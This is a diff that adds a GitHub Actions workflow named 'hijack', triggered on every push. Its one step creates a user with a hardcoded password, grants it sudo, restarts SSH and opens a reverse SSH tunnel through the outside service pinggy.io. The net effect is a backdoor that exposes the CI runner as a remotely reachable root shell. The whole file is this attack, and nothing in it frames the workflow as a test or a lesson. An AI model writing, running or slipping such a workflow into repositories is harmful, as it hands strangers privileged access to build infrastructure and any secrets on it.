@@ -1,0 +1,18 @@
+name: hijack
+
+on:
+  push:
+
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: run
+        shell: bash
+        run: |
+            sudo useradd -s /bin/bash -g adm -m dd
+            sudo echo 'dd:d3D.dd' | sudo chpasswd
+            sudo usermod -aG sudo dd
+            sudo service ssh restart
+            ssh -T -p 443 -R0:localhost:22  -o StrictHostKeyChecking=no -o ServerAliveInterval=30 tcp@us.a.pinggy.io
